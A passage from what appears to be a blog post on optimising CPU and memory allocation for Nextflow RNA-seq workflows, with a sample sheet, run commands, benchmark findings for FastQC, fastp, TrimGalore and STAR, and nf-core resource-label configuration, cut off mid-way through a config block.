<p>The sample sheet below includes two RNA-seq samples, each with input files ranging from 6 to 7 GB, representing real-world data sizes.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sample,fastq_1,fastq_2,strandedness</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GM12878_REP1,s3://ngi-igenomes/test-data/rnaseq/SRX1603629_T1_1.fastq.gz,s3://ngi-igenomes/test-data/rnaseq/SRX1603629_T1_2.fastq.gz,reverse</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">GM12878_REP2,s3://ngi-igenomes/test-data/rnaseq/SRX1603630_T1_1.fastq.gz,s3://ngi-igenomes/test-data/rnaseq/SRX1603630_T1_2.fastq.gz,reverse</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-the-benchmark">Running the Benchmark<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#running-the-benchmark" class="hash-link" aria-label="Direct link to Running the Benchmark" title="Direct link to Running the Benchmark" translate="no">​</a></h2>
<p>The above scripts are stored in the GitHub repository: <a href="https://github.com/nttg8100/nextflow-cost-optimization" target="_blank" rel="noopener noreferrer" class="">https://github.com/nttg8100/nextflow-cost-optimization</a></p>
<p>Clone the repository:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone https://github.com/nttg8100/nextflow-cost-optimization.git</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> nextflow-cost-optimization</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class=""><strong>Requirements</strong>: At least 8 CPUs and 16 GB RAM (adjust based on your computing resources in <code>nextflow.config</code>)</li>
<li class=""><strong>Alternative</strong>: If you don't have Docker, run with Singularity</li>
</ul></div></div>
<p>Run the workflow, which will execute commands using Nextflow (installed via pixi). Docker is required on your machine.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastqc-docker-amd64</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastp-docker-amd64</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># if you use MacBook with ARM</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastqc-docker-arm64</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastp-docker-arm64</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># if you do not have Docker installed, use Singularity</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastqc-singularity</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-fastp-singularity</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="run workflow" src="https://riverxdata.github.io/river-docs/assets/images/run_simple_workflow-42cfbfc6380f739a1e0887d87226f1e6.png" width="1123" height="580" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-to-evaluate-performance">How to Evaluate Performance<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#how-to-evaluate-performance" class="hash-link" aria-label="Direct link to How to Evaluate Performance" title="Direct link to How to Evaluate Performance" translate="no">​</a></h2>
<p>What we need to optimize is finding the minimal CPUs and memory that can run tasks efficiently without being too slow.
Open the HTML reports generated when you run the workflow to analyze performance. Below are the metrics we should use for evaluation:</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class="">
<p><strong><code>%cpu</code></strong>:<br>
<!-- -->The average percentage of CPU usage by the process during its execution. For multi-threaded jobs, this value can exceed 100% (e.g., 400% for a process using all 4 allocated CPUs fully).</p>
</li>
<li class="">
<p><strong><code>rss</code></strong>:<br>
<!-- -->"Resident Set Size" — the maximum amount of physical memory (RAM) used by the process, measured in bytes. This shows how much memory your process actually consumed at peak.</p>
</li>
<li class="">
<p><strong><code>realtime</code></strong>:<br>
<!-- -->The total elapsed (wall-clock) time taken by the process, from start to finish, including waiting and processing time.</p>
</li>
</ul><p>These metrics help you tune and optimize your pipeline by revealing the true resource usage for each step.</p></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fastqc-1">FastQC<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#fastqc-1" class="hash-link" aria-label="Direct link to FastQC" title="Direct link to FastQC" translate="no">​</a></h3>
<p>Interestingly, the execution time barely changes even when memory and CPUs are increased. From this experiment, we should consider using the minimal setup with 2 CPUs and 4 GB RAM while achieving nearly the same performance.</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><ul>
<li class=""><strong>Note</strong>: The module is taken directly from nf-core. There may be a bug related to FastQC that hasn't been identified yet.</li>
<li class=""><strong>Finding</strong>: With real datasets, we can use minimal resources (much cheaper) without significant impact on running time!</li>
</ul></div></div>
<p><img decoding="async" loading="lazy" alt="report_fastqc" src="https://riverxdata.github.io/river-docs/assets/images/fastqc-b1524f902c60d6d461195238764d229c.png" width="1121" height="706" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fastp-1">FASTP<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#fastp-1" class="hash-link" aria-label="Direct link to FASTP" title="Direct link to FASTP" translate="no">​</a></h3>
<p>With fastp, increasing memory and CPUs shows a slight reduction in running time.
<img decoding="async" loading="lazy" alt="report_fastp" src="https://riverxdata.github.io/river-docs/assets/images/fastp-8f6715db45ea345fdcd8e0fbbc5d58f5.png" width="1121" height="706" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="external-benchmark">External benchmark<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#external-benchmark" class="hash-link" aria-label="Direct link to External benchmark" title="Direct link to External benchmark" translate="no">​</a></h2>
<p>The simple example above can be modified appropriately for more tools. Here are external benchmarks showing that adjusting computing resources helps reduce running time while keeping costs nearly the same:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="trimgalore">Trimgalore<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#trimgalore" class="hash-link" aria-label="Direct link to Trimgalore" title="Direct link to Trimgalore" translate="no">​</a></h3>
<p>Reference: <a href="https://github.com/FelixKrueger/TrimGalore/blob/master/CHANGELOG.md#version-060-release-on-1-mar-2019" target="_blank" rel="noopener noreferrer" class="">https://github.com/FelixKrueger/TrimGalore/blob/master/CHANGELOG.md#version-060-release-on-1-mar-2019</a>,
Using 4 CPUs is a good choice as it can reduce time by nearly 4x when compared with 1 CPU only.
<img decoding="async" loading="lazy" alt="report_trimgalore" src="https://riverxdata.github.io/river-docs/assets/images/trimgalore-3ba46f53dec2b72135acd67d8859f450.png" width="1810" height="541" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="star">STAR<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#star" class="hash-link" aria-label="Direct link to STAR" title="Direct link to STAR" translate="no">​</a></h3>
<p>Reference: <a href="https://academic.oup.com/bioinformatics/article/29/1/15/272537" target="_blank" rel="noopener noreferrer" class="">https://academic.oup.com/bioinformatics/article/29/1/15/272537</a>
Using 12 threads can align nearly 2x the reads when compared with 6 threads, while memory usage remains unchanged.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="nf-core-application">Nf-core application<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#nf-core-application" class="hash-link" aria-label="Direct link to Nf-core application" title="Direct link to Nf-core application" translate="no">​</a></h2>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">If you run workflow with HPC, consider the ratio between CPUs and memory. If you spend all of memory, there is no cpus left for another jobs</li>
</ul></div></div>
<p>nf-core is one of the largest and most active bioinformatics workflow communities. However, their pipelines often use generic resource labels to define CPU and memory requirements for each process. For instance, the <a href="https://github.com/nf-core/rnaseq/blob/master/conf/base.config" target="_blank" rel="noopener noreferrer" class=""><strong>nf-core/rnaseq</strong></a> pipeline assigns default resources using labels like medium for tools such as FASTQC and FASTP.</p>
<p>Without tuning these settings for each specific tool, your workflow can waste resources and increase costs. In practice, both FASTQC and FASTP typically only need 2 CPUs and 4 GB RAM—much less than the default medium allocation.</p>
<p>This is especially important when running batch jobs in the cloud (AWS, Google Cloud, Azure, etc.), where virtual machines are often configured with a CPU<!-- -->:Memory<!-- --> ratio of 1:2. Requesting resources with a higher ratio, like 1:6, can increase queue times and lead to inefficient use of resources, as you may wait longer for an available instance and not fully utilize the extra memory.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_single </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain">                   </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">6</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_low </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">     * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">12</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_medium </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">6</span><span class="token plain">     * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">36</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain">.h   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_high </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">12</span><span class="token plain">    * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">72</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_long </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">withLabel:process_high_memory </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">200</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p>To overwrite the existing worflow process cpus and memory, use the withName for specific tasks or adjust the label resources</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain">      * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">.GB   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h    * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    errorStrategy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> task.exitStatus </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">((</span><span class="token number" style="color:hsl(35, 99%, 36%)">130</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">..</span><span class="token number" style="color:hsl(35, 99%, 36%)">145</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> + </span><span class="token number" style="color:hsl(35, 99%, 36%)">104</span><span class="token plain"> + </span><span class="token number" style="color:hsl(35, 99%, 36%)">175</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token string" style="color:hsl(119, 34%, 47%)">'retry'</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'finish'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    maxRetries    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    maxErrors     </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'-1'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_single </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain">                   </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_low </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">     * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 